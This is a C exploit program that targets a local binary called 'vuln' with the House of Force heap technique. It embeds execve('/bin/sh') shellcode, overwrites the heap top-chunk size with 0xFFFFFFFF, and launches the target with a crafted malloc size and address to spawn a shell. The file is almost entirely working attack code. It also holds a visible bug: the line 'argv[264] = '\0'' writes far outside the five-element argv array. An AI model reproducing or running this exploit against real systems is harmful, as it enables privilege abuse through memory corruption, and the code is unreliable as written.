/* Program to exploit executable 'vuln' using hof technique.
 */
#include <stdio.h>
#include <unistd.h>
#include <string.h>

#define VULNERABLE "./vuln"
#define FREE_ADDRESS 0x08049830-0x8
#define MALLOC_SIZE "0xFFFFF718"
#define BUF3_USER_INP "\x08\xa0\x04\x08"
                
/* Spawn a shell. Size - 25 bytes. */
char scode[] =
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
        
int main( void )
{       
        int i;
        char * p;
        char argv1[ 265 ];
        char * argv[] = { VULNERABLE, argv1, MALLOC_SIZE, BUF3_USER_INP, NULL };
        
        strcpy(argv1,scode);
        for(i=25;i<260;i++)
                argv1[i] = 'A';
        
        strcpy(argv1+260,"\xFF\xFF\xFF\xFF"); /* Top chunk size */
        argv[264] = '\0';/* Terminating NULL character */ 

        /* Execution of the vulnerable program */
        execve( argv[0], argv, NULL );
        return( -1 );
}